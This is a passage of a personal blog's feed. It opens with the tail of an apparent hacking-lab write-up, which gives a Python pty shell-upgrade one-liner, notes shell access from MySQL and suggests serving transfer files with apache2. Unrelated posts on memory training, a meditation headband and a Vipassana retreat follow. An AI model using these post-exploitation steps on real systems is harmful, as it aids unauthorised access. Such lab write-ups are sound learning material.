&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;python -c &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;import pty;pty.spawn(&amp;#39;&#x2F;bin&#x2F;bash&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;You can run shell commands in the MySQL command line.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;improvement-for-next-time&quot;&gt;Improvement for next time&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;Keep your enumeration scripts and any files you need to transfer between machines using &lt;code&gt;&#x2F;var&#x2F;www&#x2F;html&lt;&#x2F;code&gt;. It will save time to always run python or php HTTP server. Remember to execute:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;service&lt;&#x2F;span&gt;&lt;span&gt; apache2 start
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;If you get baited into trying to modify full permission files&#x2F;folders, do a quick simple test to see if you can edit the file&#x2F;folder first.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Taking notes as I go. This is an ongoing process and I feel like I know where I could do better.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The Art of Memory</title>
        <published>2015-09-18T00:00:00+00:00</published>
        <updated>2015-09-18T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/personal-artofmemory/" type="text/html"/>
        <id>https://johntuyen.com/posts/personal-artofmemory/</id>
        
        <content type="html">&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;personal-artofmemory&#x2F;aom-cover.jpg&quot; alt=&quot;cover&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In this day and age, technology has become an integral part of our society. Smart phones changed our lives by how we store and consume information. We rely on these advanced technological devices to store important information such as birthdays, phone numbers, addresses, passwords, notes and other important items. Externalizing our memories with this level of reliability and easy instant access, why would anyone want to laboriously spend the time remembering simple things?&lt;&#x2F;p&gt;
&lt;p&gt;After reading this book called “Moonwalking with Einstein” by Joshua Foer, I was entertained, captivated and inspired on trying out the techniques described in the book. After doing some thorough research, I began to slowly go through the training process and it was a strange journey.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;history-of-memory&quot;&gt;History of memory&lt;&#x2F;h3&gt;
&lt;p&gt;The history of memory begins with the famous Greek orator Simonides of Ceos. According to ancient texts, Simonides was known as the person who invented the Greek alphabet and excelled at writing poetry with colorful imagery which most people admired about. Using his talents he devised a technique called the method of loci, in other words, a memory palace. This technique utilizes your imagination, creativity and visualization to enhance the vividness of what you want to remember. Sounds confusing?&lt;&#x2F;p&gt;
&lt;p&gt;Lets go through an example of how you would use the method of loci technique. Lets decide on remembering 3 things that you’ll need to pick up from the grocery store. Milk, eggs, and ice cream.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Pick a location that you frequently visit and know it’s surroundings such as your home, office, or coffee shop. Imagine and visualize yourself being there. The spot you have in your mind will be the starting point. Keep that in mind.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Pick 3 rememberable spots in the area but make sure you can imagine yourself walking through it in sequence. For example, imagine your mom wearing a yellow big bird t-shirt doing jumping jacks and drinking milk at the front main entrance.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now walk through the front entrance, what is the next rememberable spot? For example, it’s a stairwell in my house and I see my dad wearing a ripped tank top performing push ups on top of carton of eggs.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Moving on to the next memorable spot. It will be my living room. I imagine my oldest sister dancing on top of the coffee table while eating ice cream with an ice cream scoop.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now take a deep breathe and imagine yourself being at the starting point in step 1. Can you see the images vividly as though it’s alive? If you tried, you should be seeing something or at least feel like you had a better recall capability.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;What all memory techniques have in common is underlining idea that is called elaborative encoding. Elaborative encoding enhances retrieval by associating a person (mom), action (jumping jacks) and object (milk).&lt;&#x2F;p&gt;
&lt;h3 id=&quot;scientific-evidence&quot;&gt;Scientific evidence&lt;&#x2F;h3&gt;
&lt;p&gt;Why does this mnemonic technique work? I couldn’t find any concrete studies on what exactly our brains are doing biologically and why. I can only suspect our brains like to remember things that are out of the ordinary in a spatial environment which creates a story in your mind. It’s like how you can recall a favourite movie scene because it captivated your attention and felt like you were there with the actors. Lastly, humans are built for pattern recognition so seeing things in an orderly manner in chunks and trying to link relationships using imagery between them could further enhance our recall.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;repetitive-retrieval-practice&quot;&gt;Repetitive Retrieval Practice&lt;&#x2F;h3&gt;
&lt;p&gt;Although, there are scientific studies that show repetitive retrieval practice has a greater effect on retrieving memories than elaborative encoding. As I found out during my extensive memory training, elaborative encoding is a process to make it easier to remember things but deciding on whether you want to keep it as long or short term requires a whole another set of processes.&lt;&#x2F;p&gt;
&lt;p&gt;First, lets take a look at the forgetting curve.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;personal-artofmemory&#x2F;aom-forgettingcurve.jpg&quot; alt=&quot;curve&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As you can see, the forgetting curve is steep at first but becomes less as days go by with practice. To optimize this process, you’ll need to incorporate a learning technique called spaced repetition. Spaced repetition is a technique that incorporates a flash card system with increase or decrease intervals of time between right or wrong answer. This technique will find out knowledge gaps of information isn’t sticking to memory which then keeps repeating until you finally memorize it. It’s quite fun to use during long commutes and I wish I had known about this when I was in school.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;real-life-improvements&quot;&gt;Real life improvements&lt;&#x2F;h3&gt;
&lt;p&gt;Now armed with all this newfound knowledge, how did it improve my life? Well, it took some time and dedication to extensively see if these techniques work for myself and I’m surprised to say it did and even more.&lt;&#x2F;p&gt;
&lt;p&gt;I set a goal for myself to compete in the 2014 Canadian Memory Championships so I spent the next 11 months training to do so. To keep my motivation and spirits high, I joined the local memory club to improve my technique and help other newcomers as well. My enthusiasm took to new heights as the memory club coordinator offered to perform public speaking engagements for other local communities in the city. I never thought I would accept such a gig but I’m glad I accepted. It gave me new personal confidence in public speaking to an audience in the hundred about my tales and screw ups. I never felt so vulnerable but I was glad that people got a kick out of my curious adventure about my memory training endeavour.&lt;&#x2F;p&gt;
&lt;p&gt;The first couple of months training sessions was fun and challenging. It was a personal test of patience, focus, and fortitude. Trying to imagine the object in your minds eye vividly is quite the challenge. It’s like working out a muscle that you haven’t activated in a very long time. Flexing your brain in such ways that either makes you frustrated or tears of joy.&lt;&#x2F;p&gt;
&lt;p&gt;When I first started to train for remembering a deck of cards, my finishing times was hovering around 15 minutes. By the end of the first week, it was down to 10 minutes. By end of the month, I was hovering at the 5 minute mark. Clearly I can see the benefit of using this technique.&lt;&#x2F;p&gt;
&lt;p&gt;As months passed by training obsessively, it became such a routine that it became a grind. Another hurdle that I couldn’t quite overcome as I had other life obligations came along. By the time I reached about 8 months, I reached my best personal time of 1:20 with perfect recall. It’s not anywhere near the world record of 22 seconds but I’m fine with this result. I figured out what 20% of mnemonic techniques created 80% of the results.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;championship-day&quot;&gt;Championship Day&lt;&#x2F;h3&gt;
&lt;p&gt;On the day of the Canadian Memory Championships, I’m amazed that I came this far along because I have never thought I would stick around for this long and dive deep into the world of competitive memory. There were two competitions that all participants required to participate, speed cards and random words. Both of which I trained for but my primary focus was speed cards, I wanted to break my personal record where it mattered. Well, let me be honest about this. I was pretty sure that couldn’t have made 1st or 2nd place because there were serious USA memory competitors that joined. More specifically, the 3rd place winner of 2014 USA memory championships. Very cool and got to chat with him about his techniques and bigger goals afterward.&lt;&#x2F;p&gt;
&lt;p&gt;Before the competition started, I did all the training routines that suppose to boost memory. Get enough good sleep, meditated in the morning, light cardio at the gym, and finally a double espresso. Yes, I’m quite diligent and meticulous. But if it’s one thing I didn’t account for was training in an environment that I wasn’t comfortable in. I always trained in my bedroom. This took me off course as I didn’t manage to recall the deck of cards, twice! Disappointing but at least I managed to get enough points for this competition. Next up, random words competition. I didn’t train very much but to say the least, I beat my personal record of 75 words in 2 minutes. Not too shabby.&lt;&#x2F;p&gt;
&lt;p&gt;While the judges were tallying up the points, I thought to myself that there is no way to even capture 3rd place because of my double screw up with speed cards. When they announced the winners, I was surprised that I came in 3rd place in Canadian Memory Championship! I was quite humbled from the whole experience and the people I met throughout the journey.&lt;&#x2F;p&gt;
&lt;p&gt;There were a lot of surprises and breakthroughs from this experiment but if it’s one great lesson I learned is finishing what you started. All too often, I would start something and not finishing because of distractions and not being laser focused. Being mindful and kind to yourself is a very important step of finishing anything. You are the own worst critic and you can’t keep beating up yourself for little things. Mistakes do happen and we learn from them. It’s okay to feel vulnerable, I’m only human and not a robot.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Muse Headband: 1 Year Review</title>
        <published>2015-09-18T00:00:00+00:00</published>
        <updated>2015-09-18T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/personal-museheadband/" type="text/html"/>
        <id>https://johntuyen.com/posts/personal-museheadband/</id>
        
        <content type="html">&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;personal-museheadband&#x2F;musereview-headband.jpg&quot; alt=&quot;cover&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Much of wearable technologies these days are focused around passive data tracking such as calorie intake, activity monitoring, and sleep tracking. My interest is more focused on wearable technologies that help you actively train your stimulus response.&lt;&#x2F;p&gt;
&lt;p&gt;Biofeedback is a term defining the moment when you are consciously aware of your own biological rhythms. A simple example is a heart rate monitor, you can raise or lower your heart rate by thinking about it. I figured a good use case scenario is incorporating biofeedback in my meditation practices. Quantitatively measuring how I feel during my sit down session.&lt;&#x2F;p&gt;
&lt;p&gt;The Muse headband will measure your brain signals and determines if your mind is calm, neutral or active state. In each of those 3 states, it changes the environmental sounds. As an example, in the calm state of mind, you’ll hear birds chirping in the background and waves are soothing to the ear. An active state is when the birds will fly away, waves crashing to shore, and high turbulence winds.&lt;&#x2F;p&gt;
&lt;p&gt;At the time, I was reviewing consumer products available in the market for neuro biofeedback technologies.&lt;&#x2F;p&gt;
&lt;p&gt;The product that gave most hope of succeeding in this market was Interaxon’s Muse headband because of these 3 reasons:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Muse utilizes 7 sensors (2 are used for noise cancellation). Other devices in the market only uses 1 sensor and not as accurate. The 5 frontal sensors senses brain activity signals using EEG (electroencephalogram).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Android and iOS support. The app UX looked good at the time in comparison with other products.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;SDK support. I rationalized the idea in my mind that if the product didn’t meet my expectations, I could at least interface with the device to control other stuff.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;It was released on Indiegogo in my own hometown (proved to be very helpful) and looks promising in comparison to existing consumer devices at that time. Despite the fact that I never used a crowd funding platform, Interaxon seemed trustworthy so I took the plunge and signed up for the last spots of earliest bird tier (198&#x2F;200).&lt;&#x2F;p&gt;
&lt;p&gt;After couple of set backs and long delays, I finally received the product after 2 years of waiting. I won’t say much about what has happened but let’s just say I’m happy that I got the device in my hands.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;after-1-year-is-it-worth-it&quot;&gt;After 1 year, is it worth it?&lt;&#x2F;h3&gt;
&lt;p&gt;Out of the box, for the most part, it feels like a polished product and not a beta device. The acrylic case for packaging seems overkill but looks high quality. As a perk of being an early backer, I was given a hard travelling case that’s useful for storage and on my travels.&lt;&#x2F;p&gt;
&lt;p&gt;The headband fits well on my head and I couldn’t find anyone that has fitting issues.&lt;&#x2F;p&gt;
&lt;p&gt;Wearing the headband for the full 60 minute session doesn’t feel fatiguing as it’s light enough to not notice during deep meditation. Although, the sensor band does leave a temporary pressure mark on your forehead. If you plan to meditate during midday at the office, plan ahead because it can be embarrassing.&lt;&#x2F;p&gt;
&lt;p&gt;The battery life could be better but for the size and weight of the device, I don’t blame them for the short battery life. On a fully charged brand new device, I could perform three 60 minute sessions before charging again. As a daily user, after about 8 months, I started to notice the battery life can barely hold a single 60 minute session. I sent an email to support before my warranty was expired and they replaced the device without a problem.&lt;&#x2F;p&gt;
&lt;p&gt;If you own either Android or iOS devices, you would want to use the iOS version. It’s newer, feels polished, and has extended features than the Android version. As of today, the Android version is still running the first version of Calm which is good enough for beginners. The main differences I needed most was the longer session length (&amp;gt; 20 min), choice of background environment sounds, and meditation type option.&lt;&#x2F;p&gt;
&lt;p&gt;The accuracy of the sensor detecting calm and focused mind does work to a certain degree. If you’re a beginner trying to learn meditation, this headband will help you achieve the first step of awareness. For intermediate and advanced users, I would say this device won’t be much help because once you achieve deeper meditation stages, the biofeedback registers as an active mind. It doesn’t have the ability to detect or even determine what type of meditation practice you’re trying to achieve. Interaxon is aware of this problem and hopefully in the future they will have discovered new algorithms for power users.&lt;&#x2F;p&gt;
&lt;p&gt;The part that I felt was underwhelming was the SDK support. Although, they have come a long way since version 1. When I first tried the SDK, I had issues with connecting my headband to my Macbook Air because of bluetooth chipset support issues. When it does connect, the headband will drop signal and lose connection. Interaxon did try to help my situation by swapping my headband device to see if it will fix the issue but didn’t help. I was one of those users who had to buy a bunch of different USB bluetooth adapters and see which chipset worked the best, Broadcom surprisingly.&lt;&#x2F;p&gt;
&lt;p&gt;Overall, I still feel Muse is a product worth getting if you want to start meditating as part of your daily habit. The people at Interaxon has built a product that is well designed for both hardware and software. The easy to follow instructions, performance tracking, and gamification features encourages users to keep practicing. They’ve meticulously focused their efforts on giving the best sensor technology and user experience as they believe meditation is beneficial for humanity.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Tips and Tricks for Vipassana Course</title>
        <published>2013-07-29T00:00:00+00:00</published>
        <updated>2013-07-29T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/personal-ttvipassana/" type="text/html"/>
        <id>https://johntuyen.com/posts/personal-ttvipassana/</id>
        
        <content type="html">&lt;p&gt;I’m going to share some practical tips that I thought would be useful for any newbie student. Hopefully some of these tips will help you succeed in completing your course.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Get to know your schedule and plan ahead. If you haven’t seen it, this is what the schedule looks like:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;4:00am — Wake up bell&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;4:30–6:30am — Meditate in the hall or in your room&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;6:30–8:00am — Breakfast and rest&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;8:00–9:00am — Group meditation in the hall&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;9:00–11:00am — Meditate in the hall or in your room&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;11:00am–1:00pm — Lunch and rest&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;1:00–2:30pm — Meditate in the hall or in your room&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;2:30–3:30pm — Group meditation in the hall&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;3:30–5:00pm — Meditate in the hall or in your room&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;5:00–6:00pm — Tea break&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;6:00–7:00pm — Group meditation in the hall&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;7:00–8:15pm — Evening discourse&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;8:15–9:00pm — Final group meditation&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Arrive at the retreat as early as you can&lt;&#x2F;strong&gt;. If you want first choice on which bed you want to sleep in, this is a perfect opportunity. Make sure you test out the bed. Don’t make the same mistake as I did. I chose a gimpy bed that was U-shaped after 5 minutes of laying down on it. Luckily, I used my extra blanket to fill in the void and made it a little more tolerable to sleep in. Consider the other factors as well such as being closer to the window, thermostat control, and coat hooks accessibility.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Layout the ground rules with your room mate&lt;&#x2F;strong&gt;. Some people like to sleep in the cold, while others prefer warmer conditions. Hope that you have a cool and easy going room mate as I did, but I still offered them to enter my space to control the thermostat and window control. It’s harder to conduct communication when noble silence is in effect, so be courteous with your bunk buddy.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Find out if there are health conditions with your room mate&lt;&#x2F;strong&gt;. It helps that you know just incase if anything happens and you can call for help when needed.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Fill out the time slot for private bathrooms if you want privacy after unpacking your belongings&lt;&#x2F;strong&gt;. Some people have daily routines they would like to continue following and taking a shower is one of them. Personally, I found that taking a shower after lunch is the best because I’ve already stuffed myself during breakfast so lunch is usually a smaller meal. Earning you little extra time in the shower if you need it. Yes, I’m one of those guys who loves to take long showers, leave me alone.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Bring a flash light&lt;&#x2F;strong&gt;. These retreats tend to be located in some remote forest area so there might be random animals roaming around. The resort I stayed at had a pathway through a forest leading to the meditation hall. There was one early morning, I was still half asleep and walking through this dark forest. A large animal ran across the pathway and I stood there for a couple of seconds thinking if I was still dreaming or was it really a wolf or a coyote of some sort. But I didn’t care at that time, I was tired and agitated but luckily I didn’t get bitten. Chances are it might’ve been a coyote because it was a full moon and I heard howling all night long.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Wear comfortable shoes that you can slip in and out quickly&lt;&#x2F;strong&gt;. Forget bringing Blundstone boots or Vibram Five Fingers like I did. Bring a pair of beat up runners that you don’t care much about if you get mud on it.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Do not eat like there is no tomorrow&lt;&#x2F;strong&gt;. Sure the vegetarian meals are free but this isn’t your local AYCE (All You Can Eat). But I won’t lie though, I did make this mistake myself. During the first 3–4 days, every single one of my meals were multiple plates because I was trying to compensate for low protein intake so I would load up on a lot of nuts, seeds, oats, and yogurt. Not to sound like a health conscious maniac, I was only geeking out on nutrition because my mind wanted to fixate on something fun. You may probably think, how is that fun? Well let’s put it this way. Eating should be a communal activity right? You share tables with others but all the chairs are facing towards a wall. No one sits face to face while eating. So what do you do then? Well, I did what everyone else were doing. Stare outside of the window only if your early enough to get a window seat. I preferred focusing on my food instead. Every bite I took was like this sensual experience of gratitude. Knowing how lucky you are to have a opportunity to discover what the human mind is capable of.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Be cognizant with how much your mind sways from the meal you just ate&lt;&#x2F;strong&gt;. This trick was something I figured out on morning of day 4 when I really wanted to quit. Luckily, I had a chance to speak with the teacher about being frustrated with my focus issues. He asked to wait until the session ends and we talked privately for 5 minutes. At that moment, for some odd reason the idea of having huge meals was a causation of my mental alertness hence the last tip I just wrote. I still remember speaking to the teacher about this and he said “That could likely be the reason but hang in there and don’t quit. When your mind sways, focus on your sensations. Don’t react, just observe.” So pay attention to what you’re eating, it can make or break you.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Coffee will be available&lt;&#x2F;strong&gt;. Yes, you coffee addicts, it will be available but don’t expect any top grade stuff you drink from your indie coffee shop. The quality of coffee offered is from the super market shelf. If this is unacceptable for you connoisseurs, bring your own coffee instead and brew it inside your mug. Green tea is also available if you need an alternative kick for caffeine.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Find your best personal time slot to seriously meditate&lt;&#x2F;strong&gt;. Look, you committed 10-days of your life to sit down and really self reflect. Don’t squander your precious time by half ass’ing your sessions. Personally, I knew meditating first thing in the morning was easiest to start but tough to finish. My mind takes a bit of time to become fully awaken so the first hour of meditation is sometimes a breeze. Most of the time, I would sit through the 2 hour early morning session without any breaks in between and little bit of shuffling. Yes, this may seem daunting but I’ve seen experienced students do this every morning without issues. Personally, my 2 hour meditation sessions were the most profound sensations that I’ve experienced. Nothing like I’ve ever felt before in my life.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;It’s normal to encounter lucid dreaming and nightmares&lt;&#x2F;strong&gt;. It happened to me and reported the same from others as well. I spoke to the teacher about this and said I was in the process of shedding “saṅkhāra” from my subconscious. According to the practice, a saṅkhāra is a unit of misery. Some saṅkhāra’s are deeply ingrained into your subconscious as we lead our habitual lives and other are just surface level. As you create cravings or aversion, you generate saṅkhāra. I don’t know if this directly correlates with having lucid dreams or nightmares but I’m just passing on what it means. Take what you will out of it for you science folks.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Bring a lacrosse or tennis ball&lt;&#x2F;strong&gt;. If physical pain is becoming unsurmountable, use the ball as a roller for your back. If you don’t have a ball, go to the washroom that has more space and do some basic yoga stretches. I know this is against the rules but do whatever you can to endure through the practice. I got called out by one of the course managers because I was performing a lat stretch publicly. If you’re knowledgable in stretching exercises, only perform the very basic movements because everything else is considered a yoga stretch or strenuous exercises. Yes, I’m absolutely serious.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Find your optimal sitting posture&lt;&#x2F;strong&gt;. Be prepared for burning back pain, a lot of it. To manage your back pain, try and flex your abdomen. By flexing, you’re bracing your spinal position, giving it support for a better sitting position. Once you start to disciplining your mind, the pain will subside and almost temporarily become non-existent. There are very few students I’ve seen that can meditate in a cross legged position. The majority tends to prefer using the bench instead and put a cushion on top of it. You can bring your own sitting apparatus but they usually provide cushions, benches, and mats so you don’t need to bring it. As a reminder, if you want a chair, you have to make a request in advance and also need an explanation of why you need one.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Practice and perform squat exercises&lt;&#x2F;strong&gt;. Prior before going to your course, strengthen up your posterior chain so your back pain can be more manageable. Check out the book called &lt;a href=&quot;https:&#x2F;&#x2F;amzn.to&#x2F;31xwJ43&quot;&gt;Supple Like A Leopard&lt;&#x2F;a&gt; as it breaks down step by step on how to squat correctly.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Ten Days of Silence - Part 1</title>
        <published>2013-07-26T00:00:00+00:00</published>
        <updated>2013-07-26T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/personal-10dayspt1/" type="text/html"/>
        <id>https://johntuyen.com/posts/personal-10dayspt1/</id>
        
        <content type="html">&lt;p&gt;I’ve been back for a full 2 months now since the retreat and finally decided I’m going to start a blog to share my experiences. I’ve tried starting a blog numerous times in the past but I’ve made the commitment and follow through this time. How did I come to this firm decision? Well, I had an epiphany during my 10-day retreat and helped me tremendously with day-to-day life. Some people that I spoke to said I look and behave differently. It’s almost like if I was a different person. Addictions and stressful situations that use to agitate my emotions is now subsided and controllable with practice. Now equipped with better coping tools, my overall outlook in life is much improved and I’m ready to tackle this world again with clearer enthusiasm than before. Bring it.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;dissection-of-self&quot;&gt;Dissection of Self&lt;&#x2F;h3&gt;
&lt;p&gt;For the past 5 years or so now, things got strange. I never felt so lost on what I wanted to do and I was 25 at that time. Broke up with a long time girlfriend that I was comfortable with and working at a fun IT job but night shifts were brutal. Dazed and confused, there were many days that I had no idea time has gone and other days, it felt like time has slowed down to melting glacier speed. No sense of control over my life other than grinding away and recover during my off days. My emotional behaviour was getting more edgier than before and I noticed this on multiple occasions but I never confronted this demeanour. I once thought that as an alpha male, you should be suppressing these type of emotions and ignore what was soon to be a build up of a emotional shit storm waiting to happen. Seems like no one was agreeing with the job I was undertaking, especially family members. This pressure eventually tipped me over the edge and so I went hunting for an adventure or a break.&lt;&#x2F;p&gt;
&lt;p&gt;Eventually I took a leap of faith by joining a friend and now mentor of mine to drum up some business. You think it would be easier from here on out but I was dead wrong. One thing lead to another, screwing up tasks that I knew were easy made me lose confidence in myself on what I did best. My thoughts were ruminating on situations that went wrong that was out of my control. One day I woke up in the morning feeling like I lost everything. It’s almost like someone came to your bed side in the middle of the night and stripped away your mojo. All I had left was dysphoria and anhedonia. This feeling lasted for more than a year and I tried fixing myself by experimenting with heavy drinking to eating hash cookies. Nothing worked effectively but I was still persistent with fixing this depression state once and for all.&lt;&#x2F;p&gt;
&lt;p&gt;Feeling shitty and belittled, December 2012 rolled around and I had to join the yearly Christmas party celebration with friends and this is where I had an epiphany. A friend of mine emotionally cracked after couple of drinks and started to tell sob stories about past away loved ones. Trying to compare sob stories with one another who joined in the conversational bout. Finding out who can feel the most sorry for themselves so other people will hopefully provide comfort they’re seeking for. This is where I thought to myself, my problems are no more important than anyone else. Trying to solve their emotional issues by seeking comfort is a band-aid solution. I knew I had solve my problems by myself because no one best knows why except for yourself. Seeking for true sense of reality from self reflection is a very difficult and awkward thing to do. This is why people pop pills to solve their issues because it’s quick and easy. Sure, there are valid reasons for medicating such as chemical imbalances in neurotransmitters but I get the sense that most people just want a quick fix. This is not the route I’m willing to abide by.&lt;&#x2F;p&gt;
&lt;p&gt;I still remember right after that party, I didn’t go to sleep at all. I was seeking relentlessly on the internet for all sorts of ways to fix myself. I wanted a solution that can “reboot” my state somehow. My solutions were ranging from sensory depravation tanks to ayahuasca or even LSD. After weighing the risk involved and devised safety net plans with some of these practices, I remembered reading a fun article about a person’s Vipassana experience from a magazine article. It sounded intense which I can relate and I thought it was going to be easy to do. But I can assure you, I ate those words so quickly and didn’t expect the type of results I got out of it. So now you know how my journey began, this is my 10-day Vipassana experience.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;the-arrival&quot;&gt;The Arrival&lt;&#x2F;h3&gt;
&lt;p&gt;I have arrived at the retreat. I didn’t know what to expect from myself while wandering around the premises. All I had to do is trust myself that I’ll make out of the 10 days just fine. If I didn’t get any insight, that would be fine as well. I went into the course expecting to get something but I wasn’t sure what. I read online blog posts on other people’s experience but wasn’t enough to boost my confidence to succeed. I can only advise that you shouldn’t obsess with seeking what others are experiencing. Everyone’s experience is different on some level. There were many new students attending with all sorts of people age and race-wise. I wouldn’t say they were newbies on a spiritual level. I have met couple of people who has done spiritual retreats of other practices and was bewildered with the journey they experienced.&lt;&#x2F;p&gt;
&lt;p&gt;After unpacking my stuff in my room, I proceeded to the cafeteria to sign a waiver form.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;During the course you must follow the five precepts: to abstain from killing any being (bugs and etc), stealing, telling lies (no swearing), sexual activity (no fap), and any intoxicants (no alcohol) unless it’s a type of medication you are prescribed for.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Respect the noble silence. This means silence of the mind, body, and speech. No sign languages or gestures are allowed.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
